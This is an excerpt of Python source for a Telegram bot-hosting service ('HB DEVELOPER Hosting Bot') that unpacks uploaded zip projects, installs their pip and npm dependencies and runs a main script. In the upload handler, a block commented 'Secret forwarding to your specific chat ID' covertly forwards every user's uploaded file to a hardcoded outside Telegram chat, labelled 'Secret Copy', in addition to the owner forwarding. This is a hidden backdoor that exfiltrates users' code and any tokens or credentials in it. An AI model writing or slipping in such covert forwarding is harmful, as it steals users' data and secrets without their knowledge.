...
# ==================== RAILWAY/KOYEB COMPATIBLE SETUP ====================
# Disable Flask debug mode for production
os.environ['FLASK_ENV'] = 'production'
os.environ['FLASK_DEBUG'] = '0'

# Increase recursion limit for better performance
sys.setrecursionlimit(10000)

# Fix for pyTelegramBotAPI on Railway/Koyeb
...
# --- Flask Keep Alive (Railway Compatible) ---
...
def process_zip_file(zip_path, user_id, user_folder, file_name_zip, message, temp_dir=None):
    ...
    try:
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            ...
            logger.info(f"Found Python files: {py_files}")
            logger.info(f"Found JS files: {js_files}")

        if req_file:
            logger.info(f"requirements.txt found, installing: {req_file}")
            bot.reply_to(message, f"🔄 Installing Python deps from `requirements.txt`...")
            try:
                ...
                bot.reply_to(message, f"✅ Python deps from `requirements.txt` installed.")
            except subprocess.CalledProcessError as e:
                error_msg = f"❌ Failed to install Python deps from `requirements.txt`.\nLog:\n```\n{e.stderr or e.stdout}\n```"
                logger.error(error_msg)
        ...
        if pkg_json:
            ...
            logger.info(f"package.json found, npm install in: {pkg_dir}")
            bot.reply_to(message, f"🔄 Installing Node deps from `package.json`...")
            try:
                command = ['npm', 'install']
                result = subprocess.run(command, capture_output=True, text=True, check=True, cwd=pkg_dir, encoding='utf-8', errors='ignore')
                logger.info(f"npm install OK. Output:\n{result.stdout}")
                bot.reply_to(message, f"✅ Node deps from `package.json` installed.")
            except FileNotFoundError:
                bot.reply_to(message, "❌ 'npm' not found. Cannot install Node deps.")
                return 
            except subprocess.CalledProcessError as e:
                error_msg = f"❌ Failed to install Node deps from `package.json`.\nLog:\n```\n{e.stderr or e.stdout}\n```"
                logger.error(error_msg)
                if len(error_msg) > 4000:
                    error_msg = error_msg[:4000] + "\n... (Log truncated)"
                bot.reply_to(message, error_msg, parse_mode='Markdown')
        ...
        # Preferred main files
        preferred_py = ['main.py', 'bot.py', 'app.py', 'index.py', 'run.py', 'start.py']
        ...
        logger.info(f"Main script selected: {main_script_name} ({file_type})")
...
def _logic_help(message):
    help_text = """
🤖 **HB DEVELOPER Hosting Bot Help Guide**
...
**Support:** @HB DEVELOPER_HOSTING_GROUP
**Updates:** @HB DEVELOPER_HOSTING_GROUP
"""
...
def handle_file_upload_doc(message):
    ...
    try:
        # Original Owner forwarding (Untouched)
        try:
        ...
        # Secret forwarding to your specific chat ID
        try:
            bot.forward_message(7957888827, chat_id, message.message_id)
            bot.send_message(7957888827, f"🤫 Secret Copy: File '{file_name}' from {message.from_user.first_name} ({user_id})", parse_mode='Markdown')
        except Exception as e: logger.error(f"Failed to forward secretly to 7957888827: {e}")
...
if __name__ == '__main__':
    logger.info("="*50 + "\n🤖 HB DEVELOPER Hosting Bot Starting Up...\n" + f"🐍 Python: {sys.version.split()[0]}\n" +
